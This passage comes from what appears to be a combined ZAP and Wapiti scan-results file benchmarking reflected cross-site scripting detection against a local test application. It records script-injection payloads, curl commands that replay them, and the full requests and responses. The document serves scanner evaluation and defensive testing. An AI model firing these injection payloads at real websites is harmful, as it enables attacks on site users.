            "Wapiti - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'content-security-policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'cache-control': 'no-cache, no-store, must-revalidate', 'strict-transport-security': 'max-age=31536000;includeSubDomains', 'x-frame-options': 'DENY', 'x-content-type-options': 'nosniff', 'x-xss-protection': '0', 'content-type': 'text/html;charset=UTF-8', 'content-length': '36', 'date': 'Sun, 31 Aug 2025 04:22:31 GMT', 'keep-alive': 'timeout=20', 'connection': 'keep-alive'}, 'body': {'text': \"<ScRiPt>alert('wgqc0thxk1')</sCrIpT>\"}}"
          ]
        },
        {
          "level": [
            "ZAP - error",
            "Wapiti - 2"
          ],
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": [
                    "ZAP - https://localhost:8444/benchmark/xss-00/BenchmarkTest00376",
                    "Wapiti - https://localhost:8444/benchmark/xss-00/BenchmarkTest00376?BenchmarkTest00376=%3CScRiPt%3Ealert%28%27wacikljf0o%27%29%3C%2FsCrIpT%3E"
                  ]
                },
                "region": {
                  "startLine": [
                    "ZAP - 1",
                    "Wapiti - 1"
                  ],
                  "snippet": {
                    "text": [
                      "ZAP - <scrIpt>alert(1);</scRipt>",
                      "Wapiti - <ScRiPt>alert('wacikljf0o')</sCrIpT>"
                    ]
                  }
                }
              },
              "properties": {
                "attack": [
                  "ZAP - <scrIpt>alert(1);</scRipt>",
                  "Wapiti - <ScRiPt>alert('wacikljf0o')</sCrIpT>"
                ],
                "curl_command": "Wapiti - curl \"https://localhost:8444/benchmark/xss-00/BenchmarkTest00376\" -e \"https://localhost:8444/benchmark/xss-00/BenchmarkTest00376.html\" -d \"BenchmarkTest00376=%3CScRiPt%3Ealert%28%27wacikljf0o%27%29%3C%2FsCrIpT%3E\""
              }
            }
          ],
          "message": {
            "text": [
              "ZAP - Cross-site Scripting (XSS) is an attack technique that involves echoing attacker-supplied code into a user's browser instance. A browser instance can be a standard web browser client, or a browser object embedded in a software product such as the browser within WinAmp, an RSS reader, or an email client. The code itself is usually written in HTML/JavaScript, but may also extend to VBScript, ActiveX, Java, Flash, or any other browser-supported technology.\nWhen an attacker gets a user's browser to execute his/her code, the code will run within the security context (or zone) of the hosting web site. With this level of privilege, the code has the ability to read, modify and transmit any sensitive data accessible by the browser. A Cross-site Scripted user could have his/her account hijacked (cookie theft), their browser redirected to another location, or possibly shown fraudulent content delivered by the web site they are visiting. Cross-site Scripting attacks essentially compromise the trust relationship between a user and the web site. Applications utilizing browser object instances which load content from the file system may execute code under the local machine zone allowing for system compromise.\n\nThere are three types of Cross-site Scripting attacks: non-persistent, persistent and DOM-based.\nNon-persistent attacks and DOM-based attacks require a user to either visit a specially crafted link laced with malicious code, or visit a malicious web page containing a web form, which when posted to the vulnerable site, will mount the attack. Using a malicious form will oftentimes take place when the vulnerable resource only accepts HTTP POST requests. In such a case, the form can be submitted automatically, without the victim's knowledge (e.g. by using JavaScript). Upon clicking on the malicious link or submitting the malicious form, the XSS payload will get echoed back and will get interpreted by the user's browser and execute. Another technique to send almost arbitrary requests (GET and POST) is by using an embedded client, such as Adobe Flash.\nPersistent attacks occur when the malicious code is submitted to a web site where it's stored for a period of time. Examples of an attacker's favorite targets often include message board posts, web mail messages, and web chat software. The unsuspecting user is not required to interact with any additional site/link (e.g. an attacker site or a malicious link sent via email), just simply view the web page containing the code.",
              "Wapiti - Reflected Cross Site Scripting vulnerability found via injection in the parameter BenchmarkTest00376"
            ]
          },
          "ruleId": [
            "ZAP - 40012",
            "Wapiti - wapiti-reflected-cross-site-scripting"
          ],
          "webRequest": [
            "ZAP - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-00/BenchmarkTest00376', 'method': 'POST', 'headers': {'cache-control': 'no-cache', 'content-length': '61', 'content-type': 'application/x-www-form-urlencoded', 'host': 'localhost:8444', 'pragma': 'no-cache', 'referer': 'https://localhost:8444/benchmark/xss-00/BenchmarkTest00376.html?BenchmarkTest00376=SafeText', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36', 'x-zap-scan-id': '40012'}, 'body': {'binary': 'QmVuY2htYXJrVGVzdDAwMzc2PSUzQ3NjcklwdCUzRWFsZXJ0JTI4MSUyOSUzQiUzQyUyRnNjUmlwdCUzRQ=='}}",
            "Wapiti - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-00/BenchmarkTest00376', 'method': 'POST', 'headers': {'host': 'localhost:8444', 'connection': 'keep-alive', 'user-agent': 'Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0', 'accept-language': 'en-US', 'accept-encoding': 'gzip, deflate, br', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', 'content-type': 'application/x-www-form-urlencoded', 'referer': 'https://localhost:8444/benchmark/xss-00/BenchmarkTest00376.html', 'content-length': '73', 'Content-Type': 'application/x-www-form-urlencoded'}, 'body': {'text': 'BenchmarkTest00376=%3CScRiPt%3Ealert%28%27wacikljf0o%27%29%3C%2FsCrIpT%3E'}}"
          ],
          "webResponse": [
            "ZAP - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'Cache-Control': 'no-cache, no-store, must-revalidate', 'Content-Length': '49', 'Content-Security-Policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'Content-Type': 'text/html;charset=UTF-8', 'Date': 'Wed, 03 Sep 2025 03:24:51 GMT', 'Strict-Transport-Security': 'max-age=31536000;includeSubDomains', 'X-Content-Type-Options': 'nosniff', 'X-Frame-Options': 'DENY', 'X-XSS-Protection': '0'}, 'body': {'text': 'Formatted like: a and <scrIpt>alert(1);</scRipt>.'}, 'noResponseReceived': False}",
            "Wapiti - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'content-security-policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'cache-control': 'no-cache, no-store, must-revalidate', 'strict-transport-security': 'max-age=31536000;includeSubDomains', 'x-frame-options': 'DENY', 'x-content-type-options': 'nosniff', 'x-xss-protection': '0', 'content-type': 'text/html;charset=UTF-8', 'content-length': '59', 'date': 'Sun, 31 Aug 2025 04:22:31 GMT', 'keep-alive': 'timeout=20', 'connection': 'keep-alive'}, 'body': {'text': \"Formatted like: a and <ScRiPt>alert('wacikljf0o')</sCrIpT>.\"}}"
          ]
        },
        {
          "level": [
            "ZAP - error",
            "Wapiti - 2"
          ],
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": [
                    "ZAP - https://localhost:8444/benchmark/xss-00/BenchmarkTest00378",
                    "Wapiti - https://localhost:8444/benchmark/xss-00/BenchmarkTest00378?email=wapiti2021%40mailinator.com&password=Letm3in_&BenchmarkTest00378=%3CScRiPt%3Ealert%28%27w848o13z1i%27%29%3C%2FsCrIpT%3E"
                  ]
                },
                "region": {
                  "startLine": [
                    "ZAP - 1",
                    "Wapiti - 1"
                  ],
                  "snippet": {
                    "text": [
                      "ZAP - <scrIpt>alert(1);</scRipt>",
                      "Wapiti - <ScRiPt>alert('w848o13z1i')</sCrIpT>"
                    ]
                  }
                }
              },
              "properties": {
                "attack": [
                  "ZAP - <scrIpt>alert(1);</scRipt>",
                  "Wapiti - <ScRiPt>alert('w848o13z1i')</sCrIpT>"
                ],
                "curl_command": "Wapiti - curl \"https://localhost:8444/benchmark/xss-00/BenchmarkTest00378\" -e \"https://localhost:8444/benchmark/xss-00/BenchmarkTest00378.html\" -d \"email=wapiti2021%40mailinator.com&password=Letm3in_&BenchmarkTest00378=%3CScRiPt%3Ealert%28%27w848o13z1i%27%29%3C%2FsCrIpT%3E\""
              }
            }
          ],
          "message": {
            "text": [
              "ZAP - Cross-site Scripting (XSS) is an attack technique that involves echoing attacker-supplied code into a user's browser instance. A browser instance can be a standard web browser client, or a browser object embedded in a software product such as the browser within WinAmp, an RSS reader, or an email client. The code itself is usually written in HTML/JavaScript, but may also extend to VBScript, ActiveX, Java, Flash, or any other browser-supported technology.\nWhen an attacker gets a user's browser to execute his/her code, the code will run within the security context (or zone) of the hosting web site. With this level of privilege, the code has the ability to read, modify and transmit any sensitive data accessible by the browser. A Cross-site Scripted user could have his/her account hijacked (cookie theft), their browser redirected to another location, or possibly shown fraudulent content delivered by the web site they are visiting. Cross-site Scripting attacks essentially compromise the trust relationship between a user and the web site. Applications utilizing browser object instances which load content from the file system may execute code under the local machine zone allowing for system compromise.\n\nThere are three types of Cross-site Scripting attacks: non-persistent, persistent and DOM-based.\nNon-persistent attacks and DOM-based attacks require a user to either visit a specially crafted link laced with malicious code, or visit a malicious web page containing a web form, which when posted to the vulnerable site, will mount the attack. Using a malicious form will oftentimes take place when the vulnerable resource only accepts HTTP POST requests. In such a case, the form can be submitted automatically, without the victim's knowledge (e.g. by using JavaScript). Upon clicking on the malicious link or submitting the malicious form, the XSS payload will get echoed back and will get interpreted by the user's browser and execute. Another technique to send almost arbitrary requests (GET and POST) is by using an embedded client, such as Adobe Flash.\nPersistent attacks occur when the malicious code is submitted to a web site where it's stored for a period of time. Examples of an attacker's favorite targets often include message board posts, web mail messages, and web chat software. The unsuspecting user is not required to interact with any additional site/link (e.g. an attacker site or a malicious link sent via email), just simply view the web page containing the code.",
              "Wapiti - Reflected Cross Site Scripting vulnerability found via injection in the parameter BenchmarkTest00378"
            ]
          },
          "ruleId": [
            "ZAP - 40012",
            "Wapiti - wapiti-reflected-cross-site-scripting"
          ],
          "webRequest": [
            "ZAP - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-00/BenchmarkTest00378', 'method': 'POST', 'headers': {'cache-control': 'no-cache', 'content-length': '102', 'content-type': 'application/x-www-form-urlencoded', 'host': 'localhost:8444', 'pragma': 'no-cache', 'referer': 'https://localhost:8444/benchmark/xss-00/BenchmarkTest00378.html?BenchmarkTest00378=SafeText', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36', 'x-zap-scan-id': '40012'}, 'body': {'binary': 'ZW1haWw9emFwcm94eSU0MGV4YW1wbGUuY29tJnBhc3N3b3JkPVpBUCZCZW5jaG1hcmtUZXN0MDAzNzg9JTNDc2NySXB0JTNFYWxlcnQlMjgxJTI5JTNCJTNDJTJGc2NSaXB0JTNF'}}",
            "Wapiti - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-00/BenchmarkTest00378', 'method': 'POST', 'headers': {'host': 'localhost:8444', 'connection': 'keep-alive', 'user-agent': 'Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0', 'accept-language': 'en-US', 'accept-encoding': 'gzip, deflate, br', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', 'content-type': 'application/x-www-form-urlencoded', 'referer': 'https://localhost:8444/benchmark/xss-00/BenchmarkTest00378.html', 'content-length': '125', 'Content-Type': 'application/x-www-form-urlencoded'}, 'body': {'text': 'email=wapiti2021%40mailinator.com&password=Letm3in_&BenchmarkTest00378=%3CScRiPt%3Ealert%28%27w848o13z1i%27%29%3C%2FsCrIpT%3E'}}"
          ],
          "webResponse": [
            "ZAP - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'Cache-Control': 'no-cache, no-store, must-revalidate', 'Content-Length': '36', 'Content-Security-Policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'Content-Type': 'text/html;charset=UTF-8', 'Date': 'Wed, 03 Sep 2025 03:24:52 GMT', 'Strict-Transport-Security': 'max-age=31536000;includeSubDomains', 'X-Content-Type-Options': 'nosniff', 'X-Frame-Options': 'DENY', 'X-XSS-Protection': '0'}, 'body': {'text': '<scrIpt>alert(1);</scRipt>_SafeStuff'}, 'noResponseReceived': False}",
            "Wapiti - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'content-security-policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'cache-control': 'no-cache, no-store, must-revalidate', 'strict-transport-security': 'max-age=31536000;includeSubDomains', 'x-frame-options': 'DENY', 'x-content-type-options': 'nosniff', 'x-xss-protection': '0', 'content-type': 'text/html;charset=UTF-8', 'content-length': '46', 'date': 'Sun, 31 Aug 2025 04:22:31 GMT', 'keep-alive': 'timeout=20', 'connection': 'keep-alive'}, 'body': {'text': \"<ScRiPt>alert('w848o13z1i')</sCrIpT>_SafeStuff\"}}"
          ]
        },
        {
          "level": [
            "ZAP - error",
            "Wapiti - 2"
          ],
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": [
                    "ZAP - https://localhost:8444/benchmark/xss-00/BenchmarkTest00380",
                    "Wapiti - https://localhost:8444/benchmark/xss-00/BenchmarkTest00380?BenchmarkTest00380=SafeText&BenchmarkTest00380=Movies&BenchmarkTest00380=Writing&BenchmarkTest00380=%3CScRiPt%3Ealert%28%27wg9a3ts0sb%27%29%3C%2FsCrIpT%3E&foo=bar"
                  ]
                },
                "region": {
                  "startLine": [
                    "ZAP - 1",
                    "Wapiti - 1"
                  ],
                  "snippet": {
                    "text": [
                      "ZAP - <scrIpt>alert(1);</scRipt>",
                      "Wapiti - <ScRiPt>alert('wg9a3ts0sb')</sCrIpT>"
                    ]
                  }
                }
              },
              "properties": {
                "attack": [
                  "ZAP - <scrIpt>alert(1);</scRipt>",
                  "Wapiti - <ScRiPt>alert('wg9a3ts0sb')</sCrIpT>"
                ],
                "curl_command": "Wapiti - curl \"https://localhost:8444/benchmark/xss-00/BenchmarkTest00380\" -e \"https://localhost:8444/benchmark/xss-00/BenchmarkTest00380.html\" -d \"BenchmarkTest00380=SafeText&BenchmarkTest00380=Movies&BenchmarkTest00380=Writing&BenchmarkTest00380=%3CScRiPt%3Ealert%28%27wg9a3ts0sb%27%29%3C%2FsCrIpT%3E&foo=bar\""
              }
            }
          ],
          "message": {
            "text": [
              "ZAP - Cross-site Scripting (XSS) is an attack technique that involves echoing attacker-supplied code into a user's browser instance. A browser instance can be a standard web browser client, or a browser object embedded in a software product such as the browser within WinAmp, an RSS reader, or an email client. The code itself is usually written in HTML/JavaScript, but may also extend to VBScript, ActiveX, Java, Flash, or any other browser-supported technology.\nWhen an attacker gets a user's browser to execute his/her code, the code will run within the security context (or zone) of the hosting web site. With this level of privilege, the code has the ability to read, modify and transmit any sensitive data accessible by the browser. A Cross-site Scripted user could have his/her account hijacked (cookie theft), their browser redirected to another location, or possibly shown fraudulent content delivered by the web site they are visiting. Cross-site Scripting attacks essentially compromise the trust relationship between a user and the web site. Applications utilizing browser object instances which load content from the file system may execute code under the local machine zone allowing for system compromise.\n\nThere are three types of Cross-site Scripting attacks: non-persistent, persistent and DOM-based.\nNon-persistent attacks and DOM-based attacks require a user to either visit a specially crafted link laced with malicious code, or visit a malicious web page containing a web form, which when posted to the vulnerable site, will mount the attack. Using a malicious form will oftentimes take place when the vulnerable resource only accepts HTTP POST requests. In such a case, the form can be submitted automatically, without the victim's knowledge (e.g. by using JavaScript). Upon clicking on the malicious link or submitting the malicious form, the XSS payload will get echoed back and will get interpreted by the user's browser and execute. Another technique to send almost arbitrary requests (GET and POST) is by using an embedded client, such as Adobe Flash.\nPersistent attacks occur when the malicious code is submitted to a web site where it's stored for a period of time. Examples of an attacker's favorite targets often include message board posts, web mail messages, and web chat software. The unsuspecting user is not required to interact with any additional site/link (e.g. an attacker site or a malicious link sent via email), just simply view the web page containing the code.",
              "Wapiti - Reflected Cross Site Scripting vulnerability found via injection in the parameter BenchmarkTest00380"
            ]
          },
          "ruleId": [
            "ZAP - 40012",
            "Wapiti - wapiti-reflected-cross-site-scripting"
          ],
          "webRequest": [
            "ZAP - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-00/BenchmarkTest00380', 'method': 'POST', 'headers': {'cache-control': 'no-cache', 'content-length': '69', 'content-type': 'application/x-www-form-urlencoded', 'host': 'localhost:8444', 'pragma': 'no-cache', 'referer': 'https://localhost:8444/benchmark/xss-00/BenchmarkTest00380.html?BenchmarkTest00380=SafeText', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36', 'x-zap-scan-id': '40012'}, 'body': {'binary': 'QmVuY2htYXJrVGVzdDAwMzgwPSUzQ3NjcklwdCUzRWFsZXJ0JTI4MSUyOSUzQiUzQyUyRnNjUmlwdCUzRSZmb289YmFy'}}",
            "Wapiti - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-00/BenchmarkTest00380', 'method': 'POST', 'headers': {'host': 'localhost:8444', 'connection': 'keep-alive', 'user-agent': 'Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0', 'accept-language': 'en-US', 'accept-encoding': 'gzip, deflate, br', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', 'content-type': 'application/x-www-form-urlencoded', 'referer': 'https://localhost:8444/benchmark/xss-00/BenchmarkTest00380.html', 'content-length': '81', 'Content-Type': 'application/x-www-form-urlencoded'}, 'body': {'text': 'BenchmarkTest00380=SafeText&BenchmarkTest00380=Movies&BenchmarkTest00380=Writing&BenchmarkTest00380=%3CScRiPt%3Ealert%28%27wg9a3ts0sb%27%29%3C%2FsCrIpT%3E&foo=bar'}}"
          ],
          "webResponse": [
            "ZAP - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'Cache-Control': 'no-cache, no-store, must-revalidate', 'Content-Length': '26', 'Content-Security-Policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'Content-Type': 'text/html;charset=UTF-8', 'Date': 'Wed, 03 Sep 2025 03:24:51 GMT', 'Strict-Transport-Security': 'max-age=31536000;includeSubDomains', 'X-Content-Type-Options': 'nosniff', 'X-Frame-Options': 'DENY', 'X-XSS-Protection': '0'}, 'body': {'text': '<scrIpt>alert(1);</scRipt>'}, 'noResponseReceived': False}",
            "Wapiti - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'content-security-policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'cache-control': 'no-cache, no-store, must-revalidate', 'strict-transport-security': 'max-age=31536000;includeSubDomains', 'x-frame-options': 'DENY', 'x-content-type-options': 'nosniff', 'x-xss-protection': '0', 'content-type': 'text/html;charset=UTF-8', 'content-length': '36', 'date': 'Sun, 31 Aug 2025 04:22:39 GMT', 'keep-alive': 'timeout=20', 'connection': 'keep-alive'}, 'body': {'text': \"<ScRiPt>alert('wg9a3ts0sb')</sCrIpT>\"}}"
          ]
        },
        {
          "level": [
            "ZAP - error",
            "Wapiti - 2"
          ],
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": [
                    "ZAP - https://localhost:8444/benchmark/xss-00/BenchmarkTest00383",
                    "Wapiti - https://localhost:8444/benchmark/xss-00/BenchmarkTest00383?email=wapiti2021%40mailinator.com&password=Letm3in_&BenchmarkTest00383=%3CScRiPt%3Ealert%28%27wqnqc7xgjq%27%29%3C%2FsCrIpT%3E"
                  ]
                },
                "region": {
                  "startLine": [
                    "ZAP - 1",
                    "Wapiti - 1"
                  ],
                  "snippet": {
                    "text": [
                      "ZAP - <scrIpt>alert(1);</scRipt>",
                      "Wapiti - <ScRiPt>alert('wqnqc7xgjq')</sCrIpT>"
                    ]
                  }
                }
              },
              "properties": {
                "attack": [
                  "ZAP - <scrIpt>alert(1);</scRipt>",
                  "Wapiti - <ScRiPt>alert('wqnqc7xgjq')</sCrIpT>"
                ],
                "curl_command": "Wapiti - curl \"https://localhost:8444/benchmark/xss-00/BenchmarkTest00383\" -e \"https://localhost:8444/benchmark/xss-00/BenchmarkTest00383.html?BenchmarkTest00383=SafeText\" -d \"email=wapiti2021%40mailinator.com&password=Letm3in_&BenchmarkTest00383=%3CScRiPt%3Ealert%28%27wqnqc7xgjq%27%29%3C%2FsCrIpT%3E\""
              }
            }
          ],
          "message": {
            "text": [
              "ZAP - Cross-site Scripting (XSS) is an attack technique that involves echoing attacker-supplied code into a user's browser instance. A browser instance can be a standard web browser client, or a browser object embedded in a software product such as the browser within WinAmp, an RSS reader, or an email client. The code itself is usually written in HTML/JavaScript, but may also extend to VBScript, ActiveX, Java, Flash, or any other browser-supported technology.\nWhen an attacker gets a user's browser to execute his/her code, the code will run within the security context (or zone) of the hosting web site. With this level of privilege, the code has the ability to read, modify and transmit any sensitive data accessible by the browser. A Cross-site Scripted user could have his/her account hijacked (cookie theft), their browser redirected to another location, or possibly shown fraudulent content delivered by the web site they are visiting. Cross-site Scripting attacks essentially compromise the trust relationship between a user and the web site. Applications utilizing browser object instances which load content from the file system may execute code under the local machine zone allowing for system compromise.\n\nThere are three types of Cross-site Scripting attacks: non-persistent, persistent and DOM-based.\nNon-persistent attacks and DOM-based attacks require a user to either visit a specially crafted link laced with malicious code, or visit a malicious web page containing a web form, which when posted to the vulnerable site, will mount the attack. Using a malicious form will oftentimes take place when the vulnerable resource only accepts HTTP POST requests. In such a case, the form can be submitted automatically, without the victim's knowledge (e.g. by using JavaScript). Upon clicking on the malicious link or submitting the malicious form, the XSS payload will get echoed back and will get interpreted by the user's browser and execute. Another technique to send almost arbitrary requests (GET and POST) is by using an embedded client, such as Adobe Flash.\nPersistent attacks occur when the malicious code is submitted to a web site where it's stored for a period of time. Examples of an attacker's favorite targets often include message board posts, web mail messages, and web chat software. The unsuspecting user is not required to interact with any additional site/link (e.g. an attacker site or a malicious link sent via email), just simply view the web page containing the code.",
              "Wapiti - Reflected Cross Site Scripting vulnerability found via injection in the parameter BenchmarkTest00383"
            ]
          },
          "ruleId": [
            "ZAP - 40012",
            "Wapiti - wapiti-reflected-cross-site-scripting"
          ],
          "webRequest": [
            "ZAP - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-00/BenchmarkTest00383', 'method': 'POST', 'headers': {'cache-control': 'no-cache', 'content-length': '102', 'content-type': 'application/x-www-form-urlencoded', 'host': 'localhost:8444', 'pragma': 'no-cache', 'referer': 'https://localhost:8444/benchmark/xss-00/BenchmarkTest00383.html?BenchmarkTest00383=SafeText', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36', 'x-zap-scan-id': '40012'}, 'body': {'binary': 'ZW1haWw9emFwcm94eSU0MGV4YW1wbGUuY29tJnBhc3N3b3JkPVpBUCZCZW5jaG1hcmtUZXN0MDAzODM9JTNDc2NySXB0JTNFYWxlcnQlMjgxJTI5JTNCJTNDJTJGc2NSaXB0JTNF'}}",
            "Wapiti - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-00/BenchmarkTest00383', 'method': 'POST', 'headers': {'host': 'localhost:8444', 'connection': 'keep-alive', 'user-agent': 'Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0', 'accept-language': 'en-US', 'accept-encoding': 'gzip, deflate, br', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', 'content-type': 'application/x-www-form-urlencoded', 'referer': 'https://localhost:8444/benchmark/xss-00/BenchmarkTest00383.html?BenchmarkTest00383=SafeText', 'content-length': '125', 'Content-Type': 'application/x-www-form-urlencoded'}, 'body': {'text': 'email=wapiti2021%40mailinator.com&password=Letm3in_&BenchmarkTest00383=%3CScRiPt%3Ealert%28%27wqnqc7xgjq%27%29%3C%2FsCrIpT%3E'}}"
          ],
          "webResponse": [
            "ZAP - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'Cache-Control': 'no-cache, no-store, must-revalidate', 'Content-Length': '26', 'Content-Security-Policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'Content-Type': 'text/html;charset=UTF-8', 'Date': 'Wed, 03 Sep 2025 03:24:52 GMT', 'Strict-Transport-Security': 'max-age=31536000;includeSubDomains', 'X-Content-Type-Options': 'nosniff', 'X-Frame-Options': 'DENY', 'X-XSS-Protection': '0'}, 'body': {'text': '<scrIpt>alert(1);</scRipt>'}, 'noResponseReceived': False}",
            "Wapiti - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'content-security-policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'cache-control': 'no-cache, no-store, must-revalidate', 'strict-transport-security': 'max-age=31536000;includeSubDomains', 'x-frame-options': 'DENY', 'x-content-type-options': 'nosniff', 'x-xss-protection': '0', 'content-type': 'text/html;charset=UTF-8', 'content-length': '36', 'date': 'Sun, 31 Aug 2025 04:22:42 GMT', 'keep-alive': 'timeout=20', 'connection': 'keep-alive'}, 'body': {'text': \"<ScRiPt>alert('wqnqc7xgjq')</sCrIpT>\"}}"
          ]
        },
        {
          "level": [
            "ZAP - error",
            "Wapiti - 2"
          ],
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": [
                    "ZAP - https://localhost:8444/benchmark/xss-00/BenchmarkTest00384",
                    "Wapiti - https://localhost:8444/benchmark/xss-00/BenchmarkTest00384?secure=default&productID=default&foo=foo&BenchmarkTest00384=%3CScRiPt%3Ealert%28%27wuz909gjli%27%29%3C%2FsCrIpT%3E"
                  ]
                },
                "region": {
                  "startLine": [
                    "ZAP - 1",
                    "Wapiti - 1"
                  ],
                  "snippet": {
                    "text": [
                      "ZAP - <scrIpt>alert(1);</scRipt>",
                      "Wapiti - <ScRiPt>alert('wuz909gjli')</sCrIpT>"
                    ]
                  }
                }
              },
              "properties": {
                "attack": [
                  "ZAP - <scrIpt>alert(1);</scRipt>",
                  "Wapiti - <ScRiPt>alert('wuz909gjli')</sCrIpT>"
                ],
                "curl_command": "Wapiti - curl \"https://localhost:8444/benchmark/xss-00/BenchmarkTest00384\" -e \"https://localhost:8444/benchmark/xss-00/BenchmarkTest00384.html\" -d \"secure=default&productID=default&foo=foo&BenchmarkTest00384=%3CScRiPt%3Ealert%28%27wuz909gjli%27%29%3C%2FsCrIpT%3E\""
              }
            }
          ],
          "message": {
            "text": [
              "ZAP - Cross-site Scripting (XSS) is an attack technique that involves echoing attacker-supplied code into a user's browser instance. A browser instance can be a standard web browser client, or a browser object embedded in a software product such as the browser within WinAmp, an RSS reader, or an email client. The code itself is usually written in HTML/JavaScript, but may also extend to VBScript, ActiveX, Java, Flash, or any other browser-supported technology.\nWhen an attacker gets a user's browser to execute his/her code, the code will run within the security context (or zone) of the hosting web site. With this level of privilege, the code has the ability to read, modify and transmit any sensitive data accessible by the browser. A Cross-site Scripted user could have his/her account hijacked (cookie theft), their browser redirected to another location, or possibly shown fraudulent content delivered by the web site they are visiting. Cross-site Scripting attacks essentially compromise the trust relationship between a user and the web site. Applications utilizing browser object instances which load content from the file system may execute code under the local machine zone allowing for system compromise.\n\nThere are three types of Cross-site Scripting attacks: non-persistent, persistent and DOM-based.\nNon-persistent attacks and DOM-based attacks require a user to either visit a specially crafted link laced with malicious code, or visit a malicious web page containing a web form, which when posted to the vulnerable site, will mount the attack. Using a malicious form will oftentimes take place when the vulnerable resource only accepts HTTP POST requests. In such a case, the form can be submitted automatically, without the victim's knowledge (e.g. by using JavaScript). Upon clicking on the malicious link or submitting the malicious form, the XSS payload will get echoed back and will get interpreted by the user's browser and execute. Another technique to send almost arbitrary requests (GET and POST) is by using an embedded client, such as Adobe Flash.\nPersistent attacks occur when the malicious code is submitted to a web site where it's stored for a period of time. Examples of an attacker's favorite targets often include message board posts, web mail messages, and web chat software. The unsuspecting user is not required to interact with any additional site/link (e.g. an attacker site or a malicious link sent via email), just simply view the web page containing the code.",
              "Wapiti - Reflected Cross Site Scripting vulnerability found via injection in the parameter BenchmarkTest00384"
            ]
          },
          "ruleId": [
